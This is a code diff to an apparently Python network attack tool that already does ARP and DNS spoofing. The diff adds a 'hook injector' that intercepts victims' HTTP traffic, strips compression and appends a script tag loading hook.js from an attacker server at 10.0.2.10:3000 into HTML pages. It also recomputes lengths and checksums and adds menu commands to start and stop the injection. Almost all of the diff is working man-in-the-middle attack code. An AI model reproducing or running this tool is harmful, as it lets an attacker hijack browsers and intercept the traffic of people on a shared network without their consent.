@@ -74,7 +74,7 @@ def get_mac(ip):
     try:
         return answered_mac[0][1].hwsrc
     except IndexError:
-        print("[!] No response..")
+        pass
 
 
 # function that spoofs IPs
@@ -159,7 +159,7 @@ def arp_spoof(targets, src):
 
 
 # function that modifies DNS layer packets
-def process_packet(packet, target_website, modified_ip):
+def process_packet_dns(packet, target_website, modified_ip):
     scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
     if scapy_packet.haslayer(scapy.DNSRR):  # check if packet has a dns response layer
         qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
@@ -179,13 +179,39 @@ def process_packet(packet, target_website, modified_ip):
     packet.accept()  # allow forwarding the packet to it's destination
 
 
+# function that modifies HTTP layer packets
+def process_packet_hook(packet):
+    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
+    if scapy_packet.haslayer(scapy.Raw):  # check if packet has a Raw layer
+        load = scapy_packet[scapy.Raw].load.decode("utf-8", "ignore")
+        load = load.replace("HTTP/1.1", "HTTP/1.0")
+        if scapy_packet[scapy.TCP].dport == 80:  # it's a HTTP Request, dport: destination port, port for http
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # remove the encoding
+        elif scapy_packet[scapy.TCP].sport == 80:  # it's a HTTP Response, sport: source port, port for http
+            injection_code = '<script src="http://10.0.2.10:3000/hook.js"></script>'
+            load = load.replace("</body>", "</body>" + injection_code)
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load.decode("utf-8", "ignore"):
+            scapy_packet[scapy.Raw].load = load
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.TCP].chksum
+            packet.set_payload(bytes(scapy_packet))  # change the original payload of the packet with the modified one
+    packet.accept()  # allow forwarding the packet to it's destination
+
+
 # function that spoofs a DNS response
 def dns_spoof(target_website, modified_ip):
     subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
     queue = netfilterqueue.NetfilterQueue()  # object creation
     queue.bind(1,
                lambda packet, target_website=target_website, modified_ip=modified_ip:
-               process_packet(packet, target_website, modified_ip)
+               process_packet_dns(packet, target_website, modified_ip)
                )  # connect to an existed queue
     try:
         queue.run()
@@ -196,6 +222,20 @@ def dns_spoof(target_website, modified_ip):
         global allow_dns
         allow_dns = 1
 
+
+# function that injects a hook
+def hook():
+    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
+    queue = netfilterqueue.NetfilterQueue()  # object creation
+    queue.bind(1, process_packet_hook)  # connect to an existed queue
+    try:
+        queue.run()
+    except Exception:
+        print("[!] Something went wrong ... FlUSHING IPTABLES...")
+        subprocess.run(["iptables", "--flush"])
+        print("[+] Done.")
+        global allow_hook
+        allow_hook = 1
 
 def kill_dns():
     try:
@@ -212,10 +252,26 @@ def kill_dns():
         print('[-] No dns spoof running at the moment.')
 
 
+def kill_hook():
+    try:
+        if hook_process.is_alive():
+            hook_process.terminate()
+            print("[!] Hook process terminated ... FlUSHING IPTABLES...")
+            subprocess.run(["iptables", "--flush"])
+            print("[+] Done.")
+            global allow_hook
+            allow_hook = 1
+        else:
+            print('[-] No Hook Injector running at the moment.')
+    except NameError:
+        print('[-] No Hook Injector running at the moment.')
+
+
 def kill_arp():
     try:
         if arp_process.is_alive():
             kill_dns()
+            kill_hook()
             arp_process.terminate()
             print("[!] Arp process terminated ... Resetting ARP Tables...")
             cleanup(selected, source)
@@ -247,6 +303,7 @@ SYS_PLATFORM = sys.platform  # os of the current machine
 command = ''  # command to be executed
 allow_arp = 1  # flag that shows if an arp spoof is already running
 allow_dns = 1  # flag that shows if a dns spoof is already running
+allow_hook = 1  # flag that shows if a hook injector is already running
 scan_result = []  # list of network IPs
 router_ip = scapy.conf.route.route("0.0.0.0")[2]  # Router's ip
 
@@ -261,6 +318,7 @@ while True:
     command = input(">> ")
     # try:
     if command == "exit()":
+        kill_arp()
         print("[+] Cya later Boss!")
         time.sleep(0.1)
         sys.exit()
@@ -310,6 +368,7 @@ while True:
         if allow_dns:
             try:
                 if arp_process.is_alive():
+                    kill_hook()
                     target_website = input('Your target website: ')
                     modified_ip = input('Your redirect IP: ')
                     dns_process = multiprocessing.Process(target=dns_spoof, args=(target_website, modified_ip))
@@ -324,11 +383,31 @@ while True:
         else:
             print('[!] Dns spoof already running.')
 
+    elif command == 'hook()':
+        if allow_hook:
+            try:
+                if arp_process.is_alive():
+                    kill_dns()
+                    hook_process = multiprocessing.Process(target=hook)
+                    print("[+] Initializing Hook Injector...")
+                    time.sleep(0.1)
+                    hook_process.start()
+                    allow_hook = 0
+                else:
+                    print('[-] No arp spoof running at the moment.')
+            except NameError:
+                print('[-] No arp spoof running at the moment.')
+        else:
+            print('[!] Hook injector already running.')
+
     elif command == 'killarp()':
         kill_arp()
 
     elif command == 'killdns()':
         kill_dns()
+
+    elif command == 'killhook()':
+        kill_hook()
 
     elif command == "help()":
         print("----------------------------------")
@@ -338,8 +417,10 @@ while True:
         print("scan()          Network scanning")
         print("arpspoof()      Manual or Auto Arp Spoof")
         print("dnsspoof()      DNS Spoof Attack")
+        print("hook()          Hook Injector")
         print("killarp()       Kill process running Arp Spoof")
         print("killdns()       Kill process running Dns Spoof")
+        print("killhook()      Kill process running Hook Injector")
         print("exit()          Exit the app")
         print("----------------------------------")
 
